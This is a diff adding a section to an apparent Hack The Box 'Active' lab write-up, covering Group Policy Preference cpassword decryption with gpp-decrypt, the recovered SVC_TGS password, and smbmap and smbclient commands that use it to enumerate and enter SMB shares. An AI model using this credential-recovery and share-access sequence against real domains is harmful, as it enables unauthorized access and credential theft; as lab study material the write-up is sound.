@@ -274,3 +274,49 @@ do_connect: Connection to 10.129.186.200 failed (Error NT_STATUS_RESOURCE_NAME_N
         SYSVOL          Disk      Logon server share 
         Users           Disk      
 
+
+
+GPP Passwords
+
+Whenever a new Group Policy Preference (GPP) is created, there’s an xml file created in the SYSVOL share with that config data, including any passwords associated with the GPP. For security, Microsoft AES encrypts the password before it’s stored as cpassword. But then Microsoft published the key on MSDN!
+
+Microsoft issued a patch in 2014 that prevented admins from putting passwords into GPP. But that patch doesn’t do anything about any of these breakable passwords that were already there, and from what I understand, pentesters still find these regularly in 2018. For more details, check out this AD Security post.
+Decrypting GPP Password
+
+Since the key is known, I can decrypt the password. Kali has a tool called gpp-decrypt that will do it:
+┌──(root💀sac)-[~/Downloads/hackthebox/Active]
+└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                                                                                                               137 ⨯
+GPPstillStandingStrong2k18
+
+
+smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
+        Disk                                                    Permissions
+        ----                                                    -----------
+        ADMIN$                                                  NO ACCESS
+        C$                                                      NO ACCESS
+        IPC$                                                    NO ACCESS
+        NETLOGON                                                READ ONLY
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY
+        Users                                                   READ ONLY
+
+
+When I connect to the Users share, it looks like the C:\users\ directory,
+
+smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18                                                                                                         
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Sat Jul 21 10:39:20 2018
+  ..                                 DR        0  Sat Jul 21 10:39:20 2018
+  Administrator                       D        0  Mon Jul 16 06:14:21 2018
+  All Users                         DHS        0  Tue Jul 14 01:06:44 2009
+  Default                           DHR        0  Tue Jul 14 02:38:21 2009
+  Default User                      DHS        0  Tue Jul 14 01:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
+  Public                             DR        0  Tue Jul 14 00:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
+
+                10459647 blocks of size 4096. 6308502 blocks available
